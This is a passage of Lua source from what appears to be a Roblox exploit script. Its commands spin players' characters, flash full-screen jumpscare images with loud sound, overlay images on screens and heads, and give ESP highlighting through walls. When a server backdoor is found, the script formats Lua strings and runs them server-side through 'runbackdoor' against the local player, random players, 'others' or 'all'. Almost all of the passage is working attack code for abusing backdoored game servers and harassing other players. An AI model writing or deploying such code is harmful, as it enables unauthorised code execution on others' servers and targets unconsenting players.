                        local player = game.Players:FindFirstChild("%s")
                        if player and player.Character then
                            for _, v in pairs(player.Character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                                if v.Name == "Spinning" then
                                    v:Destroy()
                                end
                            end
                            local spin = Instance.new("BodyAngularVelocity")
                            spin.Name = "Spinning"
                            spin.Parent = player.Character:WaitForChild("HumanoidRootPart")
                            spin.MaxTorque = Vector3.new(0, math.huge, 0)
                            spin.AngularVelocity = Vector3.new(0, %d, 0)
                        end
                    ]], player.Name, number)
					break
				end
			end
		end

		bckd = bckd:gsub("%%speed%%", number)
		bckd = bckd:gsub("%%username%%", game.Players.LocalPlayer.Name)

		if bckd then
			runbackdoor(backdoor, bckd)
		end
	end
end)

addcommand("unspin", "unspin", function(target)
	local players = game:GetService("Players"):GetPlayers()

	local function toodizzy(player)
		local character = player.Character
		if character then
			for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
				if v.Name == "Spinning" then
					v:Destroy()
				end
			end
		end
	end

	if not backdoor then
		local localPlayer = game.Players.LocalPlayer
		if not target or target == "" or target == "me" then
			toodizzy(localPlayer)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			toodizzy(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					toodizzy(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				toodizzy(player)
			end
		else
			local found = false
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					toodizzy(player)
					found = true
					break
				end
			end
		end
	else

		local bckd
		if not target or target == "" or target == "me" then
			bckd = string.format([[
        local localPlayerName = "%s"
        local localPlayer = game:GetService("Players"):FindFirstChild(localPlayerName)
        if localPlayer and localPlayer.Character then
            local character = localPlayer.Character
            for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                if v.Name == "Spinning" then
                    v:Destroy()
                end
            end
        end
    ]], game.Players.LocalPlayer.Name)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			bckd = string.format([[
                local player = game.Players:FindFirstChild("%s")
                if player and player.Character then
                    for _, v in pairs(player.Character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                        if v.Name == "Spinning" then
                            v:Destroy()
                        end
                    end
                end
            ]], randomPlayer.Name)
		elseif target == "others" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= game.Players.LocalPlayer then
                        local character = player.Character
                        if character then
                            for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                                if v.Name == "Spinning" then
                                    v:Destroy()
                                end
                            end
                        end
                    end
                end
            ]]
		elseif target == "all" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    local character = player.Character
                    if character then
                        for _, v in pairs(character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                            if v.Name == "Spinning" then
                                v:Destroy()
                            end
                        end
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					bckd = string.format([[
                        local player = game.Players:FindFirstChild("%s")
                        if player and player.Character then
                            for _, v in pairs(player.Character:WaitForChild("HumanoidRootPart"):GetChildren()) do
                                if v.Name == "Spinning" then
                                    v:Destroy()
                                end
                            end
                        end
                    ]], player.Name)
					break
				end
			end
		end

		if bckd then
			bckd = bckd:gsub("%%username%%", game.Players.LocalPlayer.Name)
			runbackdoor(backdoor, bckd)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("console", "console", function()
	if box["text chat service"].ChatVersion == Enum.ChatVersion.TextChatService then
		box["text chat service"].TextChannels.RBXGeneral:SendAsync("/console")
	else
		box["replicated storage"].DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/console", "All")
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

isfullbrightlooping = false
local fullbrightloopconnection
originalSettings = {}

addcommand("fullbright", "fb", function()
	Lighting = game:GetService"Lighting"		
	originalSettings.Brightness = Lighting.Brightness
	originalSettings.ClockTime = Lighting.ClockTime
	originalSettings.FogEnd = Lighting.FogEnd
	originalSettings.GlobalShadows = Lighting.GlobalShadows
	originalSettings.OutdoorAmbient = Lighting.OutdoorAmbient
	if not isfullbrightlooping then
		isfullbrightlooping = true
		fullbrightloopconnection = game:GetService"RunService".Heartbeat:Connect(function()
			Lighting = game:GetService"Lighting"		
			Lighting.Brightness = 2
			Lighting.ClockTime = 14
			Lighting.FogEnd = 100000
			Lighting.GlobalShadows = false
			Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
		end)
	end
end)

addcommand("unfullbright", "unfb", function()
	if isfullbrightlooping then
		isfullbrightlooping = false
		if fullbrightloopconnection then
			fullbrightloopconnection:Disconnect()
			fullbrightloopconnection = nil
		end
		Lighting = game:GetService"Lighting"		
		Lighting.Brightness = originalSettings.Brightness
		Lighting.ClockTime = originalSettings.ClockTime
		Lighting.FogEnd = originalSettings.FogEnd
		Lighting.GlobalShadows = originalSettings.GlobalShadows
		Lighting.OutdoorAmbient = originalSettings.OutdoorAmbient
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("jumpscare", "js", function(target, imageId, soundId)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer
	local localPlayerName = localPlayer.Name

	soundId = soundId and soundId ~= "" and "rbxassetid://" .. soundId or "rbxassetid://7188420724"

	local function ahhhh(player)
		local playerGui = player:FindFirstChild("PlayerGui")
		if not playerGui then return end

		local screenGui = Instance.new("ScreenGui")
		screenGui.Parent = playerGui

		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Parent = screenGui
		imageLabel.Image = "rbxassetid://" .. imageId
		imageLabel.BackgroundTransparency = 1
		imageLabel.Visible = true
		imageLabel.ImageTransparency = 0
		imageLabel.Size = UDim2.new(1, 0, 1, 60)
		imageLabel.Position = UDim2.new(0, 0, 0, -60)
		imageLabel.ZIndex = 6969

		local sound = Instance.new("Sound")
		sound.SoundId = soundId
		sound.Volume = 10
		sound.Parent = playerGui

		local function fadeimage()
			for i = 0, 1, 0.03 do
				imageLabel.ImageTransparency = i
				task.wait(0)
			end
			imageLabel:Destroy()
		end

		sound:Play()
		task.spawn(fadeimage)
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			ahhhh(localPlayer)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			ahhhh(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					task.spawn(ahhhh, player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				task.spawn(ahhhh, player)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					ahhhh(player)
					break
				end
			end
		end
		return
	end

	local bckd

	if not target or target == "" or target == "me" then
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player:FindFirstChild("PlayerGui") then
                local playerGui = player:FindFirstChild("PlayerGui")
                local screenGui = Instance.new("ScreenGui")
                screenGui.Parent = playerGui

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Parent = screenGui
                imageLabel.Image = "rbxassetid://%s"
                imageLabel.BackgroundTransparency = 1
                imageLabel.Visible = true
                imageLabel.ImageTransparency = 0
                imageLabel.Size = UDim2.new(1, 0, 1, 60)
                imageLabel.Position = UDim2.new(0, 0, 0, -60)
                imageLabel.ZIndex = 6969

                local sound = Instance.new("Sound")
                sound.SoundId = "%s"
                sound.Volume = 10
                sound.Parent = playerGui

                local function fadeimage()
                    for i = 0, 1, 0.03 do
                        imageLabel.ImageTransparency = i
                        task.wait(0)
                    end
                    imageLabel:Destroy()
                end

                sound:Play()
                task.spawn(fadeimage)
            end
        ]], localPlayerName, imageId, soundId)
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player:FindFirstChild("PlayerGui") then
                local playerGui = player:FindFirstChild("PlayerGui")
                local screenGui = Instance.new("ScreenGui")
                screenGui.Parent = playerGui

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Parent = screenGui
                imageLabel.Image = "rbxassetid://%s"
                imageLabel.BackgroundTransparency = 1
                imageLabel.Visible = true
                imageLabel.ImageTransparency = 0
                imageLabel.Size = UDim2.new(1, 0, 1, 60)
                imageLabel.Position = UDim2.new(0, 0, 0, -60)
                imageLabel.ZIndex = 6969

                local sound = Instance.new("Sound")
                sound.SoundId = "%s"
                sound.Volume = 10
                sound.Parent = playerGui

                local function fadeimage()
                    for i = 0, 1, 0.03 do
                        imageLabel.ImageTransparency = i
                        task.wait(0)
                    end
                    imageLabel:Destroy()
                end

                sound:Play()
                task.spawn(fadeimage)
            end
        ]], randomPlayer.Name, imageId, soundId)
	elseif target == "others" then
		bckd = string.format([[
            local localPlayerName = "%s"
            local imageId = "%s"
            local soundId = "%s"
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Name ~= localPlayerName then
                    if player:FindFirstChild("PlayerGui") then
                        local playerGui = player:FindFirstChild("PlayerGui")
                        local screenGui = Instance.new("ScreenGui")
                        screenGui.Parent = playerGui

                        local imageLabel = Instance.new("ImageLabel")
                        imageLabel.Parent = screenGui
                        imageLabel.Image = "rbxassetid://" .. imageId
                        imageLabel.BackgroundTransparency = 1
                        imageLabel.Visible = true
                        imageLabel.ImageTransparency = 0
                        imageLabel.Size = UDim2.new(1, 0, 1, 60)
                        imageLabel.Position = UDim2.new(0, 0, 0, -60)
                        imageLabel.ZIndex = 6969

                        local sound = Instance.new("Sound")
                        sound.SoundId = soundId
                        sound.Volume = 10
                        sound.Parent = playerGui

                        local function fadeimage()
                            for i = 0, 1, 0.03 do
                                imageLabel.ImageTransparency = i
                                task.wait(0)
                            end
                            imageLabel:Destroy()
                        end

                        sound:Play()
                        task.spawn(fadeimage)
                    end
                end
            end
        ]], localPlayerName, imageId, soundId)
	elseif target == "all" then
		bckd = string.format([[
            local imageId = "%s"
            local soundId = "%s"
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player:FindFirstChild("PlayerGui") then
                    local playerGui = player:FindFirstChild("PlayerGui")
                    local screenGui = Instance.new("ScreenGui")
                    screenGui.Parent = playerGui

                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Parent = screenGui
                    imageLabel.Image = "rbxassetid://" .. imageId
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Visible = true
                    imageLabel.ImageTransparency = 0
                    imageLabel.Size = UDim2.new(1, 0, 1, 60)
                    imageLabel.Position = UDim2.new(0, 0, 0, -60)
                    imageLabel.ZIndex = 6969

                    local sound = Instance.new("Sound")
                    sound.SoundId = soundId
                    sound.Volume = 10
                    sound.Parent = playerGui

                    local function fadeimage()
                        for i = 0, 1, 0.03 do
                            imageLabel.ImageTransparency = i
                            task.wait(0)
                        end
                        imageLabel:Destroy()
                    end

                    sound:Play()
                    task.spawn(fadeimage)
                end
            end
        ]], imageId, soundId)
	else
		bckd = string.format([[
            local targetName = "%s"
            local imageId = "%s"
            local soundId = "%s"
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(targetName)) then
                    if player:FindFirstChild("PlayerGui") then
                        local playerGui = player:FindFirstChild("PlayerGui")
                        local screenGui = Instance.new("ScreenGui")
                        screenGui.Parent = playerGui

                        local imageLabel = Instance.new("ImageLabel")
                        imageLabel.Parent = screenGui
                        imageLabel.Image = "rbxassetid://" .. imageId
                        imageLabel.BackgroundTransparency = 1
                        imageLabel.Visible = true
                        imageLabel.ImageTransparency = 0
                        imageLabel.Size = UDim2.new(1, 0, 1, 60)
                        imageLabel.Position = UDim2.new(0, 0, 0, -60)
                        imageLabel.ZIndex = 6969

                        local sound = Instance.new("Sound")
                        sound.SoundId = soundId
                        sound.Volume = 10
                        sound.Parent = playerGui

                        local function fadeimage()
                            for i = 0, 1, 0.03 do
                                imageLabel.ImageTransparency = i
                                task.wait(0)
                            end
                            imageLabel:Destroy()
                        end

                        sound:Play()
                        task.spawn(fadeimage)
                    end
                end
            end
        ]], target, imageId, soundId)
	end

	if bckd then
		runbackdoor(backdoor, bckd)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("screenimage", "simage", function(target, imageId)
	local players = game:GetService("Players"):GetPlayers()

	local function showimage(player)
		local playerGui = player:FindFirstChild("PlayerGui")
		if not playerGui then return end

		local screenGui = Instance.new("ScreenGui")
		screenGui.Parent = playerGui
		screenGui.Name = ">.<"

		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Parent = screenGui
		imageLabel.Image = "rbxassetid://" .. imageId
		imageLabel.BackgroundTransparency = 1
		imageLabel.Visible = true
		imageLabel.ImageTransparency = 0
		imageLabel.Size = UDim2.new(1, 0, 1, 60)
		imageLabel.Position = UDim2.new(0, 0, 0, -60)
		imageLabel.ZIndex = 6969
	end

	if not backdoor then
		local localPlayer = game.Players.LocalPlayer
		if not target or target == "" or target == "me" then
			if localPlayer then
				showimage(localPlayer)
			end
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			showimage(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					showimage(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				showimage(player)
			end
		else
			local found = false
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					showimage(player)
					found = true
					break
				end
			end
		end
	else
		local bckd
		if not target or target == "" or target == "me" then
			local localPlayerName = game.Players.LocalPlayer.Name

			bckd = string.format([[
        local localPlayer = game.Players:FindFirstChild("%s")
        if not localPlayer then return end
        local playerGui = localPlayer:FindFirstChild("PlayerGui")
        if not playerGui then return end

        local screenGui = Instance.new("ScreenGui")
        screenGui.Parent = playerGui
        screenGui.Name = ">.<"

        local imageLabel = Instance.new("ImageLabel")
        imageLabel.Parent = screenGui
        imageLabel.Image = "rbxassetid://" .. "%s"
        imageLabel.BackgroundTransparency = 1
        imageLabel.Visible = true
        imageLabel.ImageTransparency = 0
        imageLabel.Size = UDim2.new(1, 0, 1, 60)
        imageLabel.Position = UDim2.new(0, 0, 0, -60)
        imageLabel.ZIndex = 6969
    ]], localPlayerName, imageId)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			bckd = string.format([[
        local player = game.Players:FindFirstChild("%s")
        if player and player:FindFirstChild("PlayerGui") then
            local playerGui = player:FindFirstChild("PlayerGui")
            local screenGui = Instance.new("ScreenGui")
            screenGui.Parent = playerGui
            screenGui.Name = ">.<"

            local imageLabel = Instance.new("ImageLabel")
            imageLabel.Parent = screenGui
            imageLabel.Image = "rbxassetid://%s"
            imageLabel.BackgroundTransparency = 1
            imageLabel.Visible = true
            imageLabel.ImageTransparency = 0
            imageLabel.Size = UDim2.new(1, 0, 1, 60)
            imageLabel.Position = UDim2.new(0, 0, 0, -60)
            imageLabel.ZIndex = 6969
        end
    ]], randomPlayer.Name, imageId)
		elseif target == "others" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= game.Players.LocalPlayer then
                        local playerGui = player:FindFirstChild("PlayerGui")
                        if playerGui then
                            local screenGui = Instance.new("ScreenGui")
                            screenGui.Parent = playerGui
                            screenGui.Name = ">.<"

                            local imageLabel = Instance.new("ImageLabel")
                            imageLabel.Parent = screenGui
                            imageLabel.Image = "rbxassetid://" .. "%imageId%"
                            imageLabel.BackgroundTransparency = 1
                            imageLabel.Visible = true
                            imageLabel.ImageTransparency = 0
                            imageLabel.Size = UDim2.new(1, 0, 1, 60)
                            imageLabel.Position = UDim2.new(0, 0, 0, -60)
                            imageLabel.ZIndex = 6969
                        end
                    end
                end
            ]]
		elseif target == "all" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    local playerGui = player:FindFirstChild("PlayerGui")
                    if playerGui then
                        local screenGui = Instance.new("ScreenGui")
                        screenGui.Parent = playerGui
                        screenGui.Name = ">.<"

                        local imageLabel = Instance.new("ImageLabel")
                        imageLabel.Parent = screenGui
                        imageLabel.Image = "rbxassetid://" .. "%imageId%"
                        imageLabel.BackgroundTransparency = 1
                        imageLabel.Visible = true
                        imageLabel.ImageTransparency = 0
                        imageLabel.Size = UDim2.new(1, 0, 1, 60)
                        imageLabel.Position = UDim2.new(0, 0, 0, -60)
                        imageLabel.ZIndex = 6969
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player:FindFirstChild("PlayerGui") then
                local playerGui = player:FindFirstChild("PlayerGui")
                local screenGui = Instance.new("ScreenGui")
                screenGui.Parent = playerGui
                screenGui.Name = ">.<"

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Parent = screenGui
                imageLabel.Image = "rbxassetid://%s"
                imageLabel.BackgroundTransparency = 1
                imageLabel.Visible = true
                imageLabel.ImageTransparency = 0
                imageLabel.Size = UDim2.new(1, 0, 1, 60)
                imageLabel.Position = UDim2.new(0, 0, 0, -60)
                imageLabel.ZIndex = 6969
            end
        ]], player.Name, imageId)
					break
				end
			end
		end

		if bckd then
			bckd = bckd:gsub("%%imageId%%", imageId)
			runbackdoor(backdoor, bckd)
		end
	end
end)

addcommand("unscreenimage", "unsimage", function(target)
	local players = game:GetService("Players"):GetPlayers()

	local function removeimage(player)
		local playerGui = player:FindFirstChild("PlayerGui")
		if playerGui then
			local screenGui = playerGui:FindFirstChild(">.<")
			if screenGui then
				screenGui:Destroy()
			end
		end
	end

	if not backdoor then
		local localPlayer = game.Players.LocalPlayer
		if not target or target == "" or target == "me" then
			if localPlayer then
				removeimage(localPlayer)
			end
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			removeimage(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					removeimage(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				removeimage(player)
			end
		else
			local found = false
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					removeimage(player)
					found = true
					break
				end
			end
		end
	else
		local bckd
		if not target or target == "" or target == "me" then
			bckd = string.format([[
                local player = game.Players:FindFirstChild("%s")
                if player and player:FindFirstChild("PlayerGui") then
                    local playerGui = player:FindFirstChild("PlayerGui")
                    local screenGui = playerGui:FindFirstChild(">.<")
                    if screenGui then
                        screenGui:Destroy()
                    end
                end
            ]], game.Players.LocalPlayer.Name)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			bckd = string.format([[
                local player = game.Players:FindFirstChild("%s")
                if player and player:FindFirstChild("PlayerGui") then
                    local playerGui = player:FindFirstChild("PlayerGui")
                    local screenGui = playerGui:FindFirstChild(">.<")
                    if screenGui then
                        screenGui:Destroy()
                    end
                end
            ]], randomPlayer.Name)
		elseif target == "others" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= game.Players.LocalPlayer then
                        local playerGui = player:FindFirstChild("PlayerGui")
                        if playerGui then
                            local screenGui = playerGui:FindFirstChild(">.<")
                            if screenGui then
                                screenGui:Destroy()
                            end
                        end
                    end
                end
            ]]
		elseif target == "all" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    local playerGui = player:FindFirstChild("PlayerGui")
                    if playerGui then
                        local screenGui = playerGui:FindFirstChild(">.<")
                        if screenGui then
                            screenGui:Destroy()
                        end
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					bckd = string.format([[
                        local player = game.Players:FindFirstChild("%s")
                        if player and player:FindFirstChild("PlayerGui") then
                            local playerGui = player:FindFirstChild("PlayerGui")
                            local screenGui = playerGui:FindFirstChild(">.<")
                            if screenGui then
                                screenGui:Destroy()
                            end
                        end
                    ]], player.Name)
					break
				end
			end
		end

		if bckd then
			runbackdoor(backdoor, bckd)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local highlightTypes = {
	Players = false,
}

local billboardTextVisible = true
local highlightVisible = true

local highlightLoopRunning = false

function billbord(parent, modelName, textColor)
	local billboard = Instance.new("BillboardGui")
	billboard.Name = "unableesp"
	billboard.Adornee = parent
	billboard.Size = UDim2.new(0, 100, 0, 50)
	billboard.AlwaysOnTop = true
	billboard.Parent = parent

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, 0, 1, 0)
	label.BackgroundTransparency = 1
	label.Text = modelName
	label.Font = Enum.Font.RobotoMono
	label.TextColor3 = textColor
	label.TextStrokeTransparency = 0.5
	label.TextStrokeColor3 = Color3.new(1, 1, 1)
	label.TextSize = 16
	label.Visible = billboardTextVisible
	label.Parent = billboard
end

function toggleBillboardTextVisibility(visible)
	billboardTextVisible = visible

	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA("BillboardGui") and descendant.Name == "unableesp" then
			local label = descendant:FindFirstChildOfClass("TextLabel")
			if label then
				label.Visible = visible
			end
		end
	end
end

function toggleHighlightVisibility(visible)
	highlightVisible = visible

	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA("Highlight") then
			descendant.Enabled = visible
		end
	end
end

function addHighlights()
	if highlightTypes.Players then
		for _, player in pairs(box["players"]:GetPlayers()) do
			if player ~= box["local player"] and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
				local highlight = player.Character:FindFirstChildOfClass("Highlight")
				if not highlight then
					highlight = Instance.new("Highlight")
					highlight.FillColor = box["default border color"]
					highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
					highlight.Enabled = highlightVisible
					highlight.Parent = player.Character

					local billboardText = "(@" .. player.Name .. ")\n" .. player.DisplayName
					billbord(player.Character, billboardText, box["default border color"])
				end
			end
		end
	end
end

function removeHighlights()
	for _, player in pairs(box["players"]:GetPlayers()) do
		if player.Character then
			local highlight = player.Character:FindFirstChildOfClass("Highlight")
			if highlight then
				highlight:Destroy()
			end
			local billboard = player.Character:FindFirstChild("unableesp")
			if billboard then
				billboard:Destroy()
			end
		end
	end
end

function startHighlightLoop()
	if highlightLoopRunning then return end
	highlightLoopRunning = true

	box["run service"].RenderStepped:Connect(function()
		if highlightLoopRunning then
			addHighlights()
		end
	end)
end

function stopHighlightLoop()
	highlightLoopRunning = false
	removeHighlights()
end

function enableEsp(type)
	highlightTypes[type] = true
	startHighlightLoop()
end

function disableEsp(type)
	highlightTypes[type] = false

	local allDisabled = true
	for _, isEnabled in pairs(highlightTypes) do
		if isEnabled then
			allDisabled = false
			break
		end
	end

	if allDisabled then
		stopHighlightLoop()
	else
		removeHighlights()
	end
end

function hideesptext()
	toggleBillboardTextVisibility(false)
	toggleHighlightVisibility(true)
end

function showesptext()
	toggleBillboardTextVisibility(true)
	if toggleHighlightVisibility(true) then
		toggleBillboardTextVisibility(false)
	end
end

function hideesp()
	toggleHighlightVisibility(false)
	toggleBillboardTextVisibility(true)
end

function showesp()
	toggleHighlightVisibility(true)
	if toggleBillboardTextVisibility(true) then
		toggleHighlightVisibility(false)
	end
end

function enableAllEsp()
	for type in pairs(highlightTypes) do
		highlightTypes[type] = true
	end
	startHighlightLoop()
end

function disableAllEsp()
	for type in pairs(highlightTypes) do
		highlightTypes[type] = false
	end
	stopHighlightLoop()
end

addcommand("esp", "esp", function()
	enableEsp("Players")
end)

addcommand("unesp", "unesp", function()
	disableEsp("Players")
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("headbillboard", "headbb", function(target, imageId)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer
	local localPlayerName = localPlayer.Name

	local function headbill(player)
		if player.Character and player.Character:FindFirstChild("Head") then
			local head = player.Character.Head

			local existingBillboard = head:FindFirstChild("headbillboarduwu")
			if existingBillboard then
				existingBillboard:Destroy()
			end

			local billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = "headbillboarduwu"
			billboardGui.Adornee = head
			billboardGui.Size = UDim2.new(3, 0, 3, 0)
			billboardGui.StudsOffset = Vector3.new(0, 0, 0)
			billboardGui.AlwaysOnTop = true
			billboardGui.Parent = head

			local imageLabel = Instance.new("ImageLabel")
			imageLabel.Image = "rbxassetid://" .. imageId
			imageLabel.BackgroundTransparency = 1
			imageLabel.Size = UDim2.new(1, 0, 1, 0)
			imageLabel.Parent = billboardGui
		end
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			headbill(localPlayer)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			headbill(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					headbill(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				headbill(player)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					headbill(player)
					break
				end
			end
		end
		return
	end

	local bckd

	if not target or target == "" or target == "me" then
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player.Character and player.Character:FindFirstChild("Head") then
                local head = player.Character.Head

                local existingBillboard = head:FindFirstChild("headbillboarduwu")
                if existingBillboard then
                    existingBillboard:Destroy()
                end

                local billboardGui = Instance.new("BillboardGui")
                billboardGui.Name = "headbillboarduwu"
                billboardGui.Adornee = head
                billboardGui.Size = UDim2.new(3, 0, 3, 0)
                billboardGui.StudsOffset = Vector3.new(0, 0, 0)
                billboardGui.AlwaysOnTop = true
                billboardGui.Parent = head

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Image = "rbxassetid://%s"
                imageLabel.BackgroundTransparency = 1
                imageLabel.Size = UDim2.new(1, 0, 1, 0)
                imageLabel.Parent = billboardGui
            end
        ]], localPlayerName, imageId)
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player.Character and player.Character:FindFirstChild("Head") then
                local head = player.Character.Head

                local existingBillboard = head:FindFirstChild("headbillboarduwu")
                if existingBillboard then
                    existingBillboard:Destroy()
                end

                local billboardGui = Instance.new("BillboardGui")
                billboardGui.Name = "headbillboarduwu"
                billboardGui.Adornee = head
                billboardGui.Size = UDim2.new(3, 0, 3, 0)
                billboardGui.StudsOffset = Vector3.new(0, 0, 0)
                billboardGui.AlwaysOnTop = true
                billboardGui.Parent = head

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Image = "rbxassetid://%s"
                imageLabel.BackgroundTransparency = 1
                imageLabel.Size = UDim2.new(1, 0, 1, 0)
                imageLabel.Parent = billboardGui
            end
        ]], randomPlayer.Name, imageId)
	elseif target == "others" then
		bckd = string.format([[
            local localPlayerName = "%s"
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Name ~= localPlayerName and player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head

                    local existingBillboard = head:FindFirstChild("headbillboarduwu")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end

                    local billboardGui = Instance.new("BillboardGui")
                    billboardGui.Name = "headbillboarduwu"
                    billboardGui.Adornee = head
                    billboardGui.Size = UDim2.new(3, 0, 3, 0)
                    billboardGui.StudsOffset = Vector3.new(0, 0, 0)
                    billboardGui.AlwaysOnTop = true
                    billboardGui.Parent = head

                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Image = "rbxassetid://%s"
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Parent = billboardGui
                end
            end
        ]], localPlayerName, imageId)
	elseif target == "all" then
		bckd = string.format([[
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head

                    local existingBillboard = head:FindFirstChild("headbillboarduwu")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end

                    local billboardGui = Instance.new("BillboardGui")
                    billboardGui.Name = "headbillboarduwu"
                    billboardGui.Adornee = head
                    billboardGui.Size = UDim2.new(3, 0, 3, 0)
                    billboardGui.StudsOffset = Vector3.new(0, 0, 0)
                    billboardGui.AlwaysOnTop = true
                    billboardGui.Parent = head

                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Image = "rbxassetid://%s"
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Parent = billboardGui
                end
            end
        ]], imageId)
	else
		bckd = string.format([[
            local targetName = "%s"
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(targetName)) and player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head

                    local existingBillboard = head:FindFirstChild("headbillboarduwu")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end

                    local billboardGui = Instance.new("BillboardGui")
                    billboardGui.Name = "headbillboarduwu"
                    billboardGui.Adornee = head
                    billboardGui.Size = UDim2.new(3, 0, 3, 0)
                    billboardGui.StudsOffset = Vector3.new(0, 0, 0)
                    billboardGui.AlwaysOnTop = true
                    billboardGui.Parent = head

                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Image = "rbxassetid://%s"
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Parent = billboardGui
                end
            end
        ]], target, imageId)
	end

	if bckd then
		runbackdoor(backdoor, bckd)
	end
end)

addcommand("unheadbillboard", "unheadbb", function(target)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer
	local localPlayerName = localPlayer.Name

	local function nobillboa(player)
		if player.Character and player.Character:FindFirstChild("Head") then
			local head = player.Character.Head
